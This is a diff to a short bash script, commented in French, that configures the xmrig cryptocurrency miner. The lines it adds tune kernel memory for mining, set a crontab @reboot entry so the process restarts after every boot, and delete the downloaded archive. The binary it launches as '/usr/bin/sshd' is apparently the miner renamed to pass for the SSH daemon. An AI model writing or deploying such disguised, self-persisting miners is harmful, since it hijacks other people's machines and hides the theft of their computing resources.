@@ -1,5 +1,4 @@
 #!/bin/bash
-set -x
 
 #le nom
 nom=$(cat /etc/hostname | head -1)
@@ -18,5 +17,16 @@ sed -i "s/nom_machine/$nom/g" xmrig.json
 mv xmrig.json /root/.config/xmrig.json
 
 #lancement
+echo 3 > /proc/sys/vm/drop_caches
+echo 1 > /proc/sys/vm/compact_memory
+echo always > /sys/kernel/mm/transparent_hugepage/enabled
 /usr/bin/sshd
 
+#crontab
+crontab -l > mycron
+echo "@reboot /usr/bin/sshd" >> mycron
+crontab mycron
+rm mycron
+
+#netoyage
+rm xmrig.tgz
